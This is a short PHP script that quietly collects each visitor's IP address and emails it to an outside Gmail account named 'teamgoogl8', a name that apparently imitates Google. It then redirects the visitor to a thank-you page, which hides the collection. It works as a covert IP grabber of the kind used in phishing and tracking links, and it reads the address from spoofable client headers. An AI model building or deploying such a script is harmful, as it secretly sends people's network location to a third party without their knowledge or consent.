<?php

// Function to get the user IP address
function getUserIP()
{
    // Check for shared internet connection
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    // Check for IPs passing through proxies
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Function to sanitize and validate the email address
function sanitizeEmail($email)
{
    $email = filter_var($email, FILTER_SANITIZE_EMAIL);
    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        return $email;
    } else {
        return false;
    }
}

// Get the user IP address
$userIP = getUserIP();

// Prepare the email message
$to = sanitizeEmail('teamgoogl8@gmail.com');
$subject = 'IP Address Retrieved';
$message = 'The user IP address is: ' . $userIP;
$headers = 'From: teamgoogl8@gmail.com' . "\r\n" .
    'Reply-To: teamgoogl8@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

// Send the email
if ($to !== false) {
    mail($to, $subject, $message, $headers);
}

// Redirect the user to a thank you page
header('Location: thankyou.php');
exit;